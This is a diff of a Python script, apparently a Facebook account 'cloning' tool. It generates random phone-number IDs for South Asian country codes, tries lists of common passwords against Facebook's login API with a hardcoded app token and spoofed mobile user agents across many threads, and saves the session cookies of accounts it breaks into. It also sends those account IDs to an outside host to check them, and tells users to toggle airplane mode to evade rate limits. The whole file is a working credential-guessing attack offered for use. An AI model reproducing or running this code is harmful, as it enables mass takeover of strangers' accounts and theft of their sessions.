@@ -33,6 +33,55 @@ A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[38;5;46m'
 def clear():os.system('clear');print(logo)
 def linex():print(f'{A}─────────────────────────────────────────────────')
 #──────────────{ UA-FOR-RANDOM }──────────────#
+ugen=[]
+for xd in range(5000):
+    a='Mozilla/5.0 (Linux; Android'
+    b=random.choice(['4','5','6','7','8','9','10','11','12','13','14','15','16'])
+    c='RMX3191 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome'
+    d=random.randrange(10,200)
+    e='0.4844.88 '
+    f=random.randrange(1000,8000)
+    g=random.randrange(10,200)
+    h='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/383.1.0.25.106;]'
+    uaku2=(f'{a} {b};{c}{d}.{e}.{f}.{g} {h}')
+    ugen.append(uaku2)
+for xd in range(9000):
+    a='Mozilla/5.0 (Linux; Android'
+    b=random.choice(['4','5','6','7','8','9','10','11','12','13','14','15','16'])
+    c='CPH2269 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
+    d=random.randrange(10,200)
+    e='0'
+    f=random.randrange(1000,8000)
+    g=random.randrange(10,200)
+    h='Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/348.0.0.8.103;]'
+    uaku2=(f'{a} {b};{c}{d}.{e}.{f}.{g} {h}')
+    ugen.append(uaku2)
+for ua in range(10000):
+      a='Mozilla/5.0 (Linux; Android'
+      b=random.choice(['5.1.1' , '6.0.1' , '7.1.1' , '12' , '13' , '14' , '15'])
+      y=random.choice(['SM-J320H' , 'SM-J3109' , 'J320FN' , 'SM-J320P' , 'SM-J320F' , 'SM-J320G' , 'SM-J320Y'])
+      c='Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
+      d=random.randrange(40,115)
+      e='0'
+      f=random.randrange(3000,6000)
+      g=random.randrange(20,100)
+      h='Mobile Safari/537.36'
+      aJaber=(f"{a} {b}; {y} {c}{d}.{e}.{f}.{g} {h}")
+      ugen.append(aJaber)
+for ua in range(10000):
+	a='Mozilla/5.0 (Linux; Android'
+	b=random.choice(['8','9','10','11','12','13','14','15'])
+	c='itel S661LP Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
+	d=random.randrange(40,115)
+	e='0'
+	f=random.randrange(3000,6000)
+	g=random.randrange(20,100)
+	h='Mobile Safari/537.36'
+	alhhaj=(f"{a} {b}; {c}{d}.{e}.{f}.{g} {h}")
+	ugen.append(alhhaj)
+
+
+
 def sawg():
 	model = random.choice(["Redmi 6","Redmi 7","Redmi 8","Redmi 5","Redmi 4","Redmi 3","Redmi 2"])
 	bal = "[FBAN/FB4A;FBAV/"+str(random.randint(10,100))+'.0.0.'+str(random.randint(4000,5000))+";FBBV/"+str(random.randint(4000000,5000000))+f";[FBAN/FB4A;FBAV/451.0.0.45.109;FBBV/449217850;FBDM/"+"{density=2.75,width=1080,height=2168}"+f";FBLC/en_US;FBRV/441815108;FBCR/MTS RUS;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/{model};FBSV/5.1.1;FBOP/1;FBCA/arm64-v8a:;]"
@@ -43,10 +92,10 @@ def fex():
 	facebook_version = f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
 	fbbv = str(random.randint(10000000, 66666666))
 	fbrv = str(random.randint(000000000,999999999))
-	density = random.choice(['2.25'])
-	width = random.choice(["1600"])
-	height = random.choice(["2452"])
-	ua = f"[FBAN/FB4A;FBAV/{str(facebook_version)};FBBV/{str(fbbv)};[FBAN/FB4A;FBAV/{str(facebook_version)};FBBV/{str(fbbv)};FBDM/{{density={density},width={width},height={height}}};FBLC/en_AU;FBRV/{str(fbrv)};FBCR/YES OPTUS;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.orca;FBDV/SM-T835;FBSV;FBSV/10;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
+	density = random.choice(['3.0'])
+	width = random.choice(["1080"])
+	height = random.choice(["2115"])
+	ua = f"[FBAN/FB4A;FBAV/{str(facebook_version)};FBBV/{str(fbbv)};[FBAN/FB4A;FBAV/{str(facebook_version)};FBBV/{str(fbbv)};FBDM/{{density={density},width={width},height={height}}};FBLC/en_US;FBRV/{str(fbrv)};FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.orca;FBDV/LML713DL;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
 	return ua
 
 def sex():
@@ -102,7 +151,7 @@ logo = f"""
     ██         ██    ██   ██ ██      ██   ██ 
      ██████    ██    ██████  ███████ ██   ██                                                                                  
 {A}─────────────────────────────────────────────────
-{A}|✔| OWNER   : CYBER \n{A}|✔| TOOL    : FILE/RANDOM\n{A}|✔| VERSION : 0.1.5\n{A}─────────────────────────────────────────────────"""
+{A}|✔| OWNER   : CYBER \n{A}|✔| TOOL    : FILE/RANDOM\n{A}|✔| VERSION : 0.1\n{A}─────────────────────────────────────────────────"""
 #________________ KEY ______________#
 os.system('clear');print(logo)
 attemps = 0
@@ -450,287 +499,142 @@ def filemethod3(ids,names,passlist):
 #──────────────{ RANDOM }──────────────#
 def __Randmx__():
 	clear()
-	print(f"{A}|1| BANGLADESH CLONING");print(f"{A}|2| INDIA CLONING");print(f"{A}|3| NEPAL CLONING");print(f"{A}|4| PAKISTAN CLONING");print(f"{A}|5| AFGHANISTAN CLONING");linex();option = input(f'{A}|?| CHOICE : ')
-	if option in ['A','1']:__bdx__()
-	elif option in ['B','2']:__india__()
-	elif option in ['C','3']:__nepalx__()
-	elif option in ['D','4']:__pakistan__()
-	elif option in ['E','5']:__afghanistanx__()
+	print(f"{A}|1| BANGLADESH CLONING");print(f"{A}|2| INDIA CLONING");linex();option = input(f'{A}|?| CHOICE : ')
+	if option in ['A','1']:CYBERk()
+	elif option in ['B','2']:CYBERs()
 	else:
 		print(f'\n{A}|=| OPTION FOUND');menu()
 #──────────────{ RANDOM-BD }──────────────#
-def __bdx__():
+def CYBERk():
     user=[]
-    clear()
-    print(f'{A}|=| EXAMPLE : 017 / 019 / 016 / 018');linex();code=input(f'{A}|?| CHOICE  : ')
-    clear()
-    print(f'{A}|=| EXAMPLE : 5000 / 10000 / 9999 / 99999');linex()
-    try:
-        limit=int(input(f'{A}|?| CHOICE  : '))
-    except ValueError:
-        limit=50000
-    clear()
+    os.getuid
+    os.geteuid
+    os.system("clear")
+    print(logo)
+    print(f'{A}|=| EXAMPLE : 017 / 019 / 016 ');linex()
+    code=input(f'{A}|?| CHOICE  : ')
+    os.system('clear')
+    print(logo)
     print(f"{A}|1| METHOD M1 ");print(f"{A}|2| METHOD M2 ");print(f"{A}|3| METHOD M3 ");print(f"{A}|4| METHOD M4 ");print(f"{A}|5| METHOD M5 ");linex();methodx = input(f'{A}|?| CHOICE : ')
+    os.system('clear')
+    print(logo)
+    print(f'{A}|=| EXAMPLE : 5000 / 10000 / 9999 / 99999');linex()
+    limit=int(input(f'{A}|?| CHOICE  : '))
     for nmbr in range(limit):
-        nmp=''.join(random.choice(string.digits) for _ in range(8))
+        nmp = ''.join(random.choice(string.digits) for _ in range(8))
         user.append(nmp)
-    with ThreadPool(max_workers=30) as CYBERx:
-        clear()
-        tl=str(len(user))
+    with ThreadPool(max_workers=50) as Fb_crack:
+        os.system('clear')
+        print(logo)
+        tl = str(len(user))
         print(f'{A}|=| RANDOM UID : {tl} ');print(f'{A}|=| SIM CODE   : {code} ');print(f"{A}|=| USE AIRPLANE MODE EVERY 5 MINTS ");linex()
         for love in user:
-            ids=code+love
-            passlist=[love,ids,ids[:7],ids[:6],ids[5:],ids[4:],'sadiya','jannat']
-            if methodx in ['1']:CYBERx.submit(__Randm_M1__,ids,passlist)
-            if methodx in ['2']:CYBERx.submit(__Randm_M2__,ids,passlist)
-            if methodx in ['3']:CYBERx.submit(__Randm_M3__,ids,passlist)
-            if methodx in ['4']:CYBERx.submit(__Randm_M4__,ids,passlist)
-            if methodx in ['5']:CYBERx.submit(__Randm_M5__,ids,passlist)
-    print('');print(f'\n{A}─────────────────────────────────────────────────');print(f"{A}|=| CLONING COMPLETE ");print(f"{A}|=| TOTAL OK ID :{G} {len(oks)}");print(f"{A}|=| TOTAL CP ID :{R} {len(cps)}");print(f'\n{A}─────────────────────────────────────────────────');exit()
+            pwx = [love,love[2:],code+love[:3],'57575751','Pubg123','57273200','Alh4aj']
+            uid = code+love
+            if methodx in ['1']:Fb_crack.submit (CYBERm ,uid,pwx,tl )
+            if methodx in ['2']:Fb_crack.submit (CYBERm ,uid,pwx,tl)
+            if methodx in ['3']:Fb_crack.submit (CYBERm ,uid,pwx,tl)
+            if methodx in ['4']:Fb_crack.submit (CYBERm ,uid,pwx,tl)
+            if methodx in ['5']:Fb_crack.submit (CYBERm ,uid,pwx,tl)
+    print(f'\n{A}─────────────────────────────────────────────────');print(f"{A}|=| CLONING COMPLETE ");print(f"{A}|=| TOTAL OK ID :{G} {len(oks)}");print(f"{A}|=| TOTAL CP ID :{R} {len(cps)}");print(f'\n{A}─────────────────────────────────────────────────');exit()
+
 #──────────────{ RANDOM-INDIA }──────────────#
-def __india__():
+def CYBERs():
     user=[]
-    clear()
-    print(f'{A}|=| EXAMPLE : +91639 / +98282 / +92627 ');linex();code=input(f'{A}|?| CHOICE  : ')
-    clear()
-    print(f'{A}|=| EXAMPLE : 5000 / 10000 / 9999 / 99999');linex()
-    try:
-        limit=int(input(f'{A}|?| CHOICE  : '))
-    except ValueError:
-        limit=50000
-    clear()
+    os.getuid
+    os.geteuid
+    os.system("clear")
+    print(logo)
+    print(f'{A}|=| EXAMPLE : +91639 / +98282 / +92627 ');linex()
+    code=input(f'{A}|?| CHOICE  : ')
+    os.system('clear')
+    print(logo)
     print(f"{A}|1| METHOD M1 ");print(f"{A}|2| METHOD M2 ");print(f"{A}|3| METHOD M3 ");print(f"{A}|4| METHOD M4 ");print(f"{A}|5| METHOD M5 ");linex();methodx = input(f'{A}|?| CHOICE : ')
+    os.system('clear')
+    print(logo)
+    print(f'{A}|=| EXAMPLE : 5000 / 10000 / 9999 / 99999');linex()
+    limit=int(input(f'{A}|?| CHOICE  : '))
     for nmbr in range(limit):
-        nmp = ''.join(random.choice(string.digits) for _ in range(7))
+        nmp = ''.join(random.choice(string.digits) for _ in range(8))
         user.append(nmp)
-    with ThreadPool(max_workers=30) as CYBERx:
-        clear()
-        tl=str(len(user))
+    with ThreadPool(max_workers=50) as Fb_crack:
+        os.system('clear')
+        print(logo)
+        tl = str(len(user))
         print(f'{A}|=| RANDOM UID : {tl} ');print(f'{A}|=| SIM CODE   : {code} ');print(f"{A}|=| USE AIRPLANE MODE EVERY 5 MINTS ");linex()
         for love in user:
-            ids=code+love
-            passlist=[love,ids,ids[:7],ids[:6],love[1:],"57273200","5757575"]
-            if methodx in ['1']:CYBERx.submit(__Randm_M1__,ids,passlist)
-            if methodx in ['2']:CYBERx.submit(__Randm_M2__,ids,passlist)
-            if methodx in ['3']:CYBERx.submit(__Randm_M3__,ids,passlist)
-            if methodx in ['4']:CYBERx.submit(__Randm_M4__,ids,passlist)
-            if methodx in ['5']:CYBERx.submit(__Randm_M5__,ids,passlist)
-    print('');print(f'\n{A}─────────────────────────────────────────────────');print(f"{A}|=| CLONING COMPLETE ");print(f"{A}|=| TOTAL OK ID :{G} {len(oks)}");print(f"{A}|=| TOTAL CP ID :{R} {len(cps)}");print(f'\n{A}─────────────────────────────────────────────────');exit()
-#──────────────{ RANDOM-NEPAL }──────────────#
-def __nepalx__():
-    user=[]
-    clear()
-    print(f'{A}|=| EXAMPLE : 9815 / 9840 / 9814 ');linex();code=input(f'{A}|?| CHOICE  : ')
-    clear()
-    print(f'{A}|=| EXAMPLE : 5000 / 10000 / 9999 / 99999');linex()
+            pwx = [love,love[2:],code+love[:3],'57575751','Pubg123','57273200','Alh4aj']
+            uid = code+love
+            if methodx in ['1']:Fb_crack.submit (CYBERm ,uid,pwx,tl )
+            if methodx in ['2']:Fb_crack.submit (CYBERm ,uid,pwx,tl)
+            if methodx in ['3']:Fb_crack.submit (CYBERm ,uid,pwx,tl)
+            if methodx in ['4']:Fb_crack.submit (CYBERm ,uid,pwx,tl)
+            if methodx in ['5']:Fb_crack.submit (CYBERm ,uid,pwx,tl)
+    print(f'\n{A}─────────────────────────────────────────────────');print(f"{A}|=| CLONING COMPLETE ");print(f"{A}|=| TOTAL OK ID :{G} {len(oks)}");print(f"{A}|=| TOTAL CP ID :{R} {len(cps)}");print(f'\n{A}─────────────────────────────────────────────────');exit()
+
+
+def CYBERm(uid,pwx,tl):
+    global loop
+    global cps
+    global oks
+    global agents
     try:
-        limit=int(input(f'{A}|?| CHOICE  : '))
-    except ValueError:
-        limit=50000
-    clear()
-    print(f"{A}|1| METHOD M1 ");print(f"{A}|2| METHOD M2 ");print(f"{A}|3| METHOD M3 ");print(f"{A}|4| METHOD M4 ");print(f"{A}|5| METHOD M5 ");linex();methodx = input(f'{A}|?| CHOICE : ')
-    for nmbr in range(limit):
-        nmp = "". join(random.choice(string.digits) for _ in range(6))
-        user.append(nmp)
-    with ThreadPool(max_workers=30) as CYBERx:
-        clear()
-        tl=str(len(user))
-        print(f'{A}|=| RANDOM UID : {tl} ');print(f'{A}|=| SIM CODE   : {code} ');print(f"{A}|=| USE AIRPLANE MODE EVERY 5 MINTS ");linex()
-        for love in user:
-            ids=code+love
-            passlist=[ids,love,ids[:8],ids[:7],ids[:6],'nepal12','nepal123','nepal1234','nepal12345','maya123','kathmandu','pokhara','tamang','maya1234','tamang123','tamang12345','nepal@123','kathmandu123']
-            if methodx in ['1']:CYBERx.submit(__Randm_M1__,ids,passlist)
-            if methodx in ['2']:CYBERx.submit(__Randm_M2__,ids,passlist)
-            if methodx in ['3']:CYBERx.submit(__Randm_M3__,ids,passlist)
-            if methodx in ['4']:CYBERx.submit(__Randm_M4__,ids,passlist)
-            if methodx in ['5']:CYBERx.submit(__Randm_M5__,ids,passlist)
-    print('');print(f'\n{A}─────────────────────────────────────────────────');print(f"{A}|=| CLONING COMPLETE ");print(f"{A}|=| TOTAL OK ID :{G} {len(oks)}");print(f"{A}|=| TOTAL CP ID :{R} {len(cps)}");print(f'\n{A}─────────────────────────────────────────────────');exit()
-#──────────────{ RANDOM-PAKISTAN }──────────────#
-def __pakistan__():
-    user=[]
-    clear()
-    print(f'{A}|=| EXAMPLE : 0306 / 0315 / 0345 ');linex();code=input(f'{A}|?| CHOICE  : ')
-    clear()
-    print(f'{A}|=| EXAMPLE : 5000 / 10000 / 9999 / 99999');linex()
-    try:
-        limit=int(input(f'{A}|?| CHOICE  : '))
-    except ValueError:
-        limit=50000
-    clear()
-    print(f"{A}|1| METHOD M1 ");print(f"{A}|2| METHOD M2 ");print(f"{A}|3| METHOD M3 ");print(f"{A}|4| METHOD M4 ");print(f"{A}|5| METHOD M5 ");linex();methodx = input(f'{A}|?| CHOICE : ')
-    for nmbr in range(limit):
-        nmp = "". join(random.choice(string.digits) for _ in range(7))
-        user.append(nmp)
-    with ThreadPool(max_workers=30) as CYBERx:
-        clear()
-        tl=str(len(user))
-        print(f'{A}|=| RANDOM UID : {tl} ');print(f'{A}|=| SIM CODE   : {code} ');print(f"{A}|=| USE AIRPLANE MODE EVERY 5 MINTS ");linex()
-        for love in user:
-            ids=code+love
-            passlist=[love,ids,'khankhan','khan1122','ali12345','khanbaba','pakistan','khan12345','ali1122','khankhan12345','khan','baloch','pubg','pubg1122']
-            if methodx in ['1']:CYBERx.submit(__Randm_M1__,ids,passlist)
-            if methodx in ['2']:CYBERx.submit(__Randm_M2__,ids,passlist)
-            if methodx in ['3']:CYBERx.submit(__Randm_M3__,ids,passlist)
-            if methodx in ['4']:CYBERx.submit(__Randm_M4__,ids,passlist)
-            if methodx in ['5']:CYBERx.submit(__Randm_M5__,ids,passlist)
-    print('');print(f'\n{A}─────────────────────────────────────────────────');print(f"{A}|=| CLONING COMPLETE ");print(f"{A}|=| TOTAL OK ID :{G} {len(oks)}");print(f"{A}|=| TOTAL CP ID :{R} {len(cps)}");print(f'\n{A}─────────────────────────────────────────────────');exit()
-#──────────────{ RANDOM-AFGHANISTAN }──────────────#
-def __afghanistanx__():
-    user=[]
-    clear()
-    print(f'{A}|=| EXAMPLE : +9340 / +9350 / +9330 ');linex();code=input(f'{A}|?| CHOICE  : ')
-    clear()
-    print(f'{A}|=| EXAMPLE : 5000 / 10000 / 9999 / 99999');linex()
-    try:
-        limit=int(input(f'{A}|?| CHOICE  : '))
-    except ValueError:
-        limit=50000
-    clear()
-    print(f"{A}|1| METHOD M1 ");print(f"{A}|2| METHOD M2 ");print(f"{A}|3| METHOD M3 ");print(f"{A}|4| METHOD M4 ");print(f"{A}|5| METHOD M5 ");linex();methodx = input(f'{A}|?| CHOICE : ')
-    for nmbr in range(limit):
-        nmp = "". join(random.choice(string.digits) for _ in range(7))
-        user.append(nmp)
-    with ThreadPool(max_workers=30) as CYBERx:
-        clear()
-        tl=str(len(user))
-        print(f'{A}|=| RANDOM UID : {tl} ');print(f'{A}|=| SIM CODE   : {code} ');print(f"{A}|=| USE AIRPLANE MODE EVERY 5 MINTS ");linex()
-        for love in user:
-            ids=code+love
-            passlist=[love,ids,'afghan','afghan12345','afghan123','600700','afghanistan','afghan1122','500500','100200','10002000','900900','kabul123','Û±Û³Û³Û³ÛµÛ¶Û·Û¸Û¹','Û±Û³Û³Û³ÛµÛ¶','afghan1234','kabul1234','khankhan','khan123','khan123456','khan786']
-            if methodx in ['1']:CYBERx.submit(__Randm_M1__,ids,passlist)
-            if methodx in ['2']:CYBERx.submit(__Randm_M2__,ids,passlist)
-            if methodx in ['3']:CYBERx.submit(__Randm_M3__,ids,passlist)
-            if methodx in ['4']:CYBERx.submit(__Randm_M4__,ids,passlist)
-            if methodx in ['5']:CYBERx.submit(__Randm_M5__,ids,passlist)
-    print('');print(f'\n{A}─────────────────────────────────────────────────');print(f"{A}|=| CLONING COMPLETE ");print(f"{A}|=| TOTAL OK ID :{G} {len(oks)}");print(f"{A}|=| TOTAL CP ID :{R} {len(cps)}");print(f'\n{A}─────────────────────────────────────────────────');exit()
-#──────────────{ RANDOM-METHOD-M1 }──────────────#
-def __Randm_M1__(ids,passlist):
-        global loop,oks,cps
-        sys.stdout.write(f'\r\r{A}|CYBER-M1| {loop} {len(oks)}{G}|{A}{len(cps)} ');sys.stdout.flush()
-        try:
-                for pas in passlist:
-                        accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
-                        random_seed = random.Random()
-                        data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale': 'en_GB','client_country_code': 'GB','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
-                        headers = {'User-Agent': fex(), 'Accept-Encoding': 'gzip, deflate', 'Connection': 'Keep-Alive', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(20000, 40000)), 'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
-                        url = 'https://graph.facebook.com/auth/login'
-                        po = requests.post(url,data=data,headers=headers).json()
-                        if 'session_key' in po:
-                                uid = po['uid']
-                                coki = ';'.join(i['name']+'='+i['value'] for i in po['session_cookies'])
-                                res = requests.get(f"https://rajx.pythonanywhere.com/live?uid={uid}").text
-                                if res == 'LIVE':
-                                	print(f'\r\r\x1b[38;5;46m|CYBER-OK| {uid} | {pas}');print(f'\r\r\033[1;37m|COOKIE🍪|-> {coki} ');open('/sdcard/CYBER-RNDM-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n');oks.append(uid);break
-                                if res == 'LOCK':
-                                	print(f'\r\r\033[1;31;40m|CYBER-LOCK| {uid} | {pas}');break
-                                elif 'www.facebook.com' in po['error']['message']:
-                                	print(f'\r\r\033[30;1m|CYBER-CP| {uid} | {pas}');open('/sdcard/CYBER-FILE-CP.txt','a').write(ids+'|'+pas+'\n');cps.append(ids);break
-                                else:continue
-                loop+=1
-        except:pass
-#──────────────{ RANDOM-METHOD-M2 }──────────────#
-def __Randm_M2__(ids,passlist):
-        global loop,oks,cps
-        sys.stdout.write(f'\r\r{A}|CYBER-M2| {loop} {len(oks)}{G}|{A}{len(cps)} ');sys.stdout.flush()
-        try:
-                for pas in passlist:
-                        accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
-                        random_seed = random.Random()
-                        data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale': 'en_GB','client_country_code': 'GB','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
-                        headers = {'User-Agent': fex(), 'Accept-Encoding': 'gzip, deflate', 'Connection': 'Keep-Alive', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(20000, 40000)), 'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
-                        url = 'https://api.facebook.com/auth/login'
-                        po = requests.post(url,data=data,headers=headers).json()
-                        if 'session_key' in po:
-                                uid = po['uid']
-                                coki = ';'.join(i['name']+'='+i['value'] for i in po['session_cookies'])
-                                res = requests.get(f"https://rajx.pythonanywhere.com/live?uid={uid}").text
-                                if res == 'LIVE':
-                                	print(f'\r\r\x1b[38;5;46m|CYBER-OK| {uid} | {pas}');print(f'\r\r\033[1;37m|COOKIE🍪|-> {coki} ');open('/sdcard/CYBER-RNDM-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n');oks.append(uid);break
-                                if res == 'LOCK':
-                                	print(f'\r\r\033[1;31;40m|CYBER-LOCK| {uid} | {pas}');break
-                                elif 'www.facebook.com' in po['error']['message']:
-                                	print(f'\r\r\033[30;1m|CYBER-CP| {uid} | {pas}');open('/sdcard/CYBER-FILE-CP.txt','a').write(ids+'|'+pas+'\n');cps.append(ids);break
-                                else:continue
-                loop+=1
-        except:pass
-#──────────────{ RANDOM-METHOD-M3 }──────────────#
-def __Randm_M3__(ids,passlist):
-        global loop,oks,cps
-        sys.stdout.write(f'\r\r{A}|CYBER-M3| {loop} {len(oks)}{G}|{A}{len(cps)} ');sys.stdout.flush()
-        try:
-                for pas in passlist:
-                        accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
-                        random_seed = random.Random()
-                        data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'en_US','client_country_code':'US','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
-                        headers = {'User-Agent':fex(),'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
-                        url = 'https://api.facebook.com/auth/login'
-                        po = requests.post(url,data=data,headers=headers).json()
-                        if 'session_key' in po:
-                                uid = po['uid']
-                                coki = ';'.join(i['name']+'='+i['value'] for i in po['session_cookies'])
-                                res = requests.get(f"https://rajx.pythonanywhere.com/live?uid={uid}").text
-                                if res == 'LIVE':
-                                	print(f'\r\r\x1b[38;5;46m|CYBER-OK| {uid} | {pas}');print(f'\r\r\033[1;37m|COOKIE🍪|-> {coki} ');open('/sdcard/CYBER-RNDM-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n');oks.append(uid);break
-                                if res == 'LOCK':
-                                	print(f'\r\r\033[1;31;40m|CYBER-LOCK| {uid} | {pas}');break
-                                elif 'www.facebook.com' in po['error']['message']:
-                                	print(f'\r\r\033[30;1m|CYBER-CP| {uid} | {pas}');open('/sdcard/CYBER-FILE-CP.txt','a').write(ids+'|'+pas+'\n');cps.append(ids);break
-                                else:continue
-                loop+=1
-        except:pass
-#──────────────{ RANDOM-METHOD-M4 }──────────────#
-def __Randm_M4__(ids,passlist):
-        global loop,oks,cps
-        sys.stdout.write(f'\r\r{A}|CYBER-M4| {loop} {len(oks)}{G}|{A}{len(cps)} ');sys.stdout.flush()
-        try:
-                for pas in passlist:
-                        accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
-                        random_seed = random.Random()
-                        data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'en_US','client_country_code':'US','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
-                        headers = {'User-Agent':fex(),'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
-                        url = 'https://api.facebook.com/auth/login'
-                        po = requests.post(url,data=data,headers=headers).json()
-                        if 'session_key' in po:
-                                uid = po['uid']
-                                coki = ';'.join(i['name']+'='+i['value'] for i in po['session_cookies'])
-                                print(f'\r\r\x1b[38;5;46m|CYBER-OK| {str(uid)} | {pas} ')
-                                print(f'\r\r\x1b[38;5;46m|COKI|-> {coki} ')
-                                open('/sdcard/CYBER-RNDM-OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
-                                oks.append(str(uid))
-                                break
-                        elif 'www.facebook.com' in po['error']['message']: 
-                                uid = po['error']['error_data']['uid']
-                                print(f'\r\r{R}|CYBER-CP| {str(uid)} | {pas} ')
-                                open('/sdcard/CYBER-RNDM-CP.txt','a').write(str(uid)+'|'+pas+'\n')
-                                cps.append(str(uid))
-                                break
-                        else:continue
-                loop+=1
-        except:pass
-#──────────────{ RANDOM-METHOD-M5 }──────────────#
-def __Randm_M5__(ids,passlist):
-        global loop,oks,cps
